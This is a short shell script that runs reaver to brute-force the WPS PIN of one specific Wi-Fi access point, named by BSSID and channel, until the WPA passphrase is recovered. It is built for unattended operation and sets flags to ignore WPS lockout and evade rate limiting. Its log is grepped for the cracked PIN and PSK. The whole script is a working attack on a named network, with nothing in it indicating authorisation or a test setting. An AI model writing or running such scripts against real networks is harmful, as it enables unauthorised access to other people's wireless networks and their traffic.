#!/bin/sh
# Persistent WPS Brute Force Script
# Target: OrionLink CC:28:AA:66:30:08, Channel 2
# Runs until PSK is recovered or all PINs exhausted
# Designed to run via nohup for unattended operation

IFACE="wlan1mon"
BSSID="CC:28:AA:66:30:08"
CHAN="2"
LOG="/tmp/wps_brute.log"

echo "=== Persistent WPS Brute Force ===" | tee "$LOG"
echo "Target: OrionLink ($BSSID) Ch$CHAN" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Clean old session
rm -f /etc/reaver/CC28AA663008.wpc 2>/dev/null

# Reaver flags:
# -d 3   : 3s delay between PINs
# -r 5:60 : after 5 attempts, pause 60s (anti rate-limit)
# -N     : no NACK detection (keep trying)
# -L     : ignore WPS lock state
# -T 3   : timeout 3s for M5/M7 wait
# -t 10  : receive timeout 10s
# -vv    : verbose output

echo "[*] Launching reaver..." | tee -a "$LOG"
reaver -i "$IFACE" -b "$BSSID" -c "$CHAN" -vv -d 3 -r 5:60 -N -L -T 3 -t 10 >> "$LOG" 2>&1
EXIT_CODE=$?

echo "" >> "$LOG"
echo "=== Reaver exited with code $EXIT_CODE ===" >> "$LOG"
echo "Completed: $(date)" >> "$LOG"

# Check if PSK was recovered
if grep -q "WPA PSK:" "$LOG" 2>/dev/null; then
    echo "!!! SUCCESS !!!" >> "$LOG"
    grep "WPA PSK:" "$LOG" >> "$LOG"
    grep "WPS PIN:" "$LOG" >> "$LOG"
fi
